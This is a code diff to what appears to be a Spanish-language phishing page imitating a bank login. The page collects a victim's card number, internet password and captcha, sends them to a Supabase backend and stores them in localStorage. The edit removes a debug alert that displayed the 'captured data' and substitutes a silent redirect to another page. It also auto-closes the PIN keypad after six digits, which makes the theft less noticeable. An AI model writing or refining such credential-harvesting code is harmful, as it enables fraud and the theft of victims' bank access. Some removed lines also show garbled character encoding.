@@ -849,6 +849,12 @@
         if (currentVal.length < 6) {
           hiddenInput.value = currentVal + digit;
           updateDots();
+          // Auto-cerrar teclado al llegar a 6 dígitos
+          if (hiddenInput.value.length === 6) {
+            keyboardBox.style.display = 'none';
+            keyboardInput.style.border = '';
+            keyboardInput.style.outline = '';
+          }
         }
       });
     });
@@ -1000,18 +1006,7 @@
         console.error('Error de red al enviar a Supabase:', error);
       });
       
-      // Show alert with the captured data
-      var dataSummary = 
-        'DATOS CAPTURADOS:\n' +
-        '─────────────────\n' +
-        'NÃºmero de tarjeta: ' + cardNumber + '\n' +
-        'Clave de internet: ' + password + '\n' +
-        'CÃ³digo captcha: ' + captcha + '\n' +
-        'Recordar datos: ' + (remember ? 'SÃ­' : 'No') + '\n' +
-        '─────────────────\n' +
-        'Los datos se han guardado en localStorage.';
-      
-      alert(dataSummary);
+      window.location.href = 'contador.html';
       
       console.log('Form data saved:', formData);
     });
